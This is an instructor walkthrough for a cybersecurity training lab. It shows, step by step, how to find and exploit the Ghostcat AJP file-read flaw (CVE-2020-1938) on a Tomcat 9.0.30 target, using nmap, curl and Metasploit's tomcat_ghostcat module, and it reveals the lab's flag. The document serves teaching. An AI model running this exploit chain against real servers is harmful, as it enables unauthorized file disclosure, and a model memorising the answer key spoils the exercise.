---
id: B02.M11-walkthrough
title: Austin — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/07-target7-ghostcat.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Austin — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Austin Module (`B02.M11`). Students know only the assigned subnet `192.168.16.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.16.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T7_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (for HTTP enumeration and the WEB-INF baseline)
* `metasploit-framework` (section 4 automated path via `auxiliary/admin/http/tomcat_ghostcat`)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.16.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.16.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.16.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.16.10
Host is up (0.000016s latency).
```

**Observation:** One live host responds on this subnet: **192.168.16.10**.

**Inference:** That address is the candidate to enumerate.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.16.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.16.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. We need product names, not just open ports (here, **Tomcat 9.0.30** and **ajp13**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. AJP on **8009** is outside the top-1000 set on some lists; a default port scan can miss it.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

**Observation:** Two open ports — **8080/tcp** (Apache Tomcat 9.0.30 over HTTP) and **8009/tcp** (AJP 1.3 / Apache JServ).

**Inference:** 8080 is the usual Tomcat HTTP face. 8009 is **not** a second website. Confirm the HTTP title, then look up what AJP is.

### Initial Web Probing

nmap told us HTTP on **8080**. Confirm Tomcat in the HTTP conversation: headers first, then the page title.

```bash
curl -s -D - http://192.168.16.10:8080/ -o /tmp/t7-root.html | head -12
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter.
* `-D -` — write response **headers** to stdout.
* `-o /tmp/t7-root.html` — write the **body** to a file.
* `| head -12` — only the first header lines.
* Use **`:8080`** because that is the HTTP listener nmap found (not 80).

*Header excerpt:*
```text
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
```

```bash
grep -i '<title>' /tmp/t7-root.html
```

*Why `title`:* the default Tomcat welcome page puts the version in `<title>`. We are confirming nmap’s **Apache Tomcat 9.0.30**, not hunting a CMS.

*Body excerpt:*
```html
<title>Apache Tomcat/9.0.30</title>
```

**Observation:** Default Tomcat welcome page confirms **Apache Tomcat/9.0.30**.

**Inference:** The interesting second port is still 8009. Searching `Tomcat AJP 8009` lands on Tomcat’s AJP connector docs — AJP commonly listens on **8009** ([Apache Tomcat 9 AJP Connector](https://tomcat.apache.org/tomcat-9.0-doc/config/ajp.html)).

**What AJP is:** Apache JServ Protocol is a **binary** protocol meant for a reverse proxy (httpd, nginx) to talk to Tomcat. It is not HTTP. `curl http://…:8009/` will not speak it. An older Tomcat with AJP exposed to the network is the research lead for Ghostcat.

AJP is binary. A short `curl` against 8009 only proves it is not HTTP:

```bash
curl -s --max-time 3 http://192.168.16.10:8009/ | head -c 80 | xxd
```

*`--max-time 3`* — do not hang if the binary protocol never completes an HTTP response.

You should see non-HTTP bytes, not an HTML Tomcat page.

At this point we know:

* **Apache Tomcat 9.0.30** on HTTP port 8080
* **AJP 1.3** listening on port 8009 (not HTTP)

## 3. Vulnerability Discovery

Searching from those facts — `Tomcat AJP 8009 file read` or `Tomcat 9.0.30 AJP vulnerability` — surfaces **Ghostcat (CVE-2020-1938)**, originally published by Chaitin Tech ([Ghostcat advisory](https://www.chaitin.cn/en/ghostcat)) and tracked for Tomcat 9.0.0.M1 through **9.0.30** ([CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)). This host is 9.0.30 — last version in that window. Vulhub: `vulnhub/tomcat/CVE-2020-1938/README.md`.

**What the bug is:** Ghostcat is not `../` on HTTP. An attacker who can speak AJP sets servlet **include** attributes:

```text
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
```

Tomcat then treats the request like `RequestDispatcher.include()`: an **internal** fetch of a resource **inside the deployed web application** (here, the ROOT app under Tomcat’s `webapps/ROOT/`). HTTP never uses that include path, so files Tomcat hides from GET can still be read over AJP.

**Why public PoCs start with `/WEB-INF/web.xml`:** `WEB-INF/` is part of the webapp. The servlet spec / Tomcat **refuses to serve it as static HTTP** ([Tomcat: Deployment](https://tomcat.apache.org/tomcat-9.0-doc/deployer-howto.html)). `web.xml` is the standard descriptor in that directory. Metasploit’s `tomcat_ghostcat` default `FILENAME` is `/WEB-INF/web.xml` ([module docs](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/admin/http/tomcat_ghostcat.md)). HTTP 404 + AJP success is a clean proof.

### Baseline: HTTP cannot read `WEB-INF`

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  http://192.168.16.10:8080/WEB-INF/web.xml
```

* `-o /dev/null` — discard the body; we only care about the status.
* `-w "HTTP %{http_code}\n"` — print the HTTP status code (`404` vs `200`).

*Output:*
```text
HTTP 404
```

**Observation:** GET `/WEB-INF/web.xml` over HTTP is **404**.

**Inference:** If AJP returns that same file, we have Ghostcat’s include/read primitive. That check is section 4 (an AJP-aware client — not `curl`).

## 4. Automated Path: Metasploit `tomcat_ghostcat`

Kali ships Metasploit. Search after Tomcat + AJP:

```text
msf6 > search ghostcat

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  No     Apache Tomcat AJP File Read/Inclusion
```

This is **`auxiliary/`**, not `exploit/`. It reads files over AJP; it does not open a shell.

```bash
msfconsole -q
```

```text
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 192.168.16.10
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8009
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

*`RPORT 8009`* is the AJP port nmap found, not 8080. *`FILENAME /WEB-INF/web.xml`* is the public proof file from section 3.

*Output excerpt:*
```text
[*] Running module against 192.168.16.10
<?xml version="1.0" encoding="UTF-8"?>
...
  <display-name>Welcome to Tomcat</display-name>
...
[+] 192.168.16.10:8009 - File contents save to: .../WEBINFweb.xml_....txt
```

**Observation:** The file HTTP refused is readable through AJP.

**Inference:** **CVE-2020-1938 (Ghostcat)** is confirmed. Stay on file read for the flag (section 5). There is no stock Ghostcat shell module, and this lab has no upload to plant a JSP.

## 5. Flag via the same AJP include (no shell)

### Why this is not “whatever path we try”

The include is resolved **inside the web application**, as a servlet resource path (under `webapps/ROOT/` on this image), not as an arbitrary OS path.

| Path you ask AJP to include | What Tomcat looks up | Result |
|-----------------------------|----------------------|--------|
| `/WEB-INF/web.xml` | `ROOT/WEB-INF/web.xml` (inside the app) | Readable — section 4 |
| `/WEB-INF/flag.txt` | `ROOT/WEB-INF/flag.txt` (still inside the app) | Readable if the file exists |
| `/etc/passwd` | not a resource in ROOT | fail / HTTP 500 |
| `/flag.txt` (container root) | not a resource in ROOT | same fail |

So it is **not** that Ghostcat can only open the letters `WEB-INF` by magic. It can read webapp files, including everything under `WEB-INF/` that exists on disk. It **cannot** walk off the webapp into the host filesystem. `/etc/passwd` and `/flag.txt` at `/` fail for that reason — not because the module is broken.

Prove the off-app miss:

```text
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /etc/passwd
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

*Output excerpt:*
```text
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title>...
[-] 192.168.16.10:8009 - Unable to read file, target may not be vulnerable.
```

`/flag.txt` at the filesystem root fails the same way. Other Ghostcat boxes still keep a flag at `/flag.txt` for **shell** labs; this primitive never sees that file.

`WEB-INF/` is still the right place to look: HTTP will not serve it, the include **will**, and that is where `web.xml` already proved we can read. This lab also writes the proof-of-compromise string to **`/usr/local/tomcat/webapps/ROOT/WEB-INF/flag.txt`** (same tree as `web.xml`) so the AJP include can reach it.

```text
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/flag.txt
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

*Output:*
```text
[*] Running module against 192.168.16.10
golden-cobra
[+] 192.168.16.10:8009 - File contents save to: .../WEBINFflag.tx_....txt
```

Target 7 is complete.
